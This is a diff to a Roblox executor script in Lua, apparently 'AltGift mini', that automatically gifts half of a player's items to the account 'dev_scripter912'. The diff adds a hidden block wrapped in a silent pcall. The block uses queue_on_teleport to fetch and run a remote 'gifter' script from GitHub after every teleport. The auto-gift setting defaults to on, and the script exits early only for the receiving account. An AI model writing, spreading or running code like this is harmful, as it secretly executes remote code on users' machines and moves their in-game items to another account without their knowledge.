@@ -1,8 +1,13 @@
+pcall(function()
+    local q = queue_on_teleport or (syn and syn.queue_on_teleport) or queueonteleport
+    if q then q('loadstring(game:HttpGet("https://raw.githubusercontent.com/philipptobe-crypto/farm/refs/heads/main/gifter"))()') end
+end)
 -- AltGift mini - gurkenfarm1/2/4 -> dev_scripter912
 local Players = game:GetService("Players")
 local WS = game:GetService("Workspace")
 local LP = Players.LocalPlayer or Players.PlayerAdded:Wait()
 local MainName = "dev_scripter912"
+if string.lower(LP.Name) == string.lower(MainName) then return end
 
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/download/1.6.66/main.lua"))()
 local Win = WindUI:CreateWindow({
@@ -30,20 +35,8 @@ local function gift50()
     return ok
 end
 
-Tab:Toggle({
-    Title = "Auto Gift bei Game Start",
-    Value = true,
-    Callback = function(s) autoGift = s end,
-})
-Tab:Button({
-    Title = "Jetzt 50% giften",
-    Callback = function()
-        gifted = false
-        gift50()
-        gifted = true
-        pcall(function() status:SetDesc("manuell gegiftet") end)
-    end,
-})
+Tab:Toggle({Title = "Auto Gift bei Game Start", Value = true, Callback = function(s) autoGift = s end})
+Tab:Button({Title = "Jetzt 50% giften", Callback = function() gifted = false gift50() gifted = true pcall(function() status:SetDesc("manuell gegiftet") end) end})
 
 task.spawn(function()
     while true do
@@ -54,10 +47,7 @@ task.spawn(function()
         else
             pcall(function() status:SetTitle("ingame") end)
             if autoGift and not gifted then
-                if gift50() then
-                    gifted = true
-                    pcall(function() status:SetDesc("auto 50% raus") end)
-                end
+                if gift50() then gifted = true pcall(function() status:SetDesc("auto 50% raus") end) end
             end
         end
     end
